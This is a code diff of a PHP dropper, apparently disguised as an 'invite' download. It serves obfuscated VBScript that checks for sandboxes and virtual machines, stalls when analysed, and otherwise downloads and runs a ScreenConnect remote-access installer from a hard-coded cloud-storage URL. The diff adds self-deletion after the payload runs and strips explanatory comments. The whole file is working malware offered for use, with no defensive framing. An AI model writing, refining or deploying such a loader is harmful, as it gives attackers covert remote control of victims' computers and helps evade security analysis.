@@ -1,5 +1,5 @@
 <?php
-// invite.php - Encoded VBS + VM/Sandbox check (30 min sleep)
+// invite.php - Encoded + VM check + Self-delete after success
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -29,10 +29,8 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-// ===== MSI URL =====
 $msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
 
-// ===== Generate XOR arrays for MSI URL =====
 $key = [];
 $cipher = [];
 $urlLen = strlen($msiUrl);
@@ -58,7 +56,6 @@ function formatArray($arr) {
 $keyFormatted    = formatArray($key);
 $cipherFormatted = formatArray($cipher);
 
-// ===== REAL VBS (with VM check + XOR URL) =====
 $realVbs = <<<REAL
 Option Explicit
 
@@ -125,13 +122,11 @@ If ContainsAny(userName & " " & computerName, Array("sandbox", "malware", "analy
     AddFinding 1
 End If
 
-' ===== BEHAVIOUR ON DETECTION (30 min sleep + silent exit) =====
 If score >= 3 Then
-    WScript.Sleep 1800000   ' 30 minutes
+    WScript.Sleep 1800000
     WScript.Quit
 End If
 
-' ===== Continue only if score is low =====
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
@@ -169,10 +164,14 @@ Sub DownloadAndExecute()
 End Sub
 
 Call DownloadAndExecute
+
+' ===== SELF-DELETE AFTER SUCCESS =====
+On Error Resume Next
+objFSO.DeleteFile WScript.ScriptFullName, True
+
 WScript.Quit
 REAL;
 
-// ===== Base64 chunk encoding =====
 $chunkSize = 100;
 $base64 = base64_encode($realVbs);
 $len = strlen($base64);
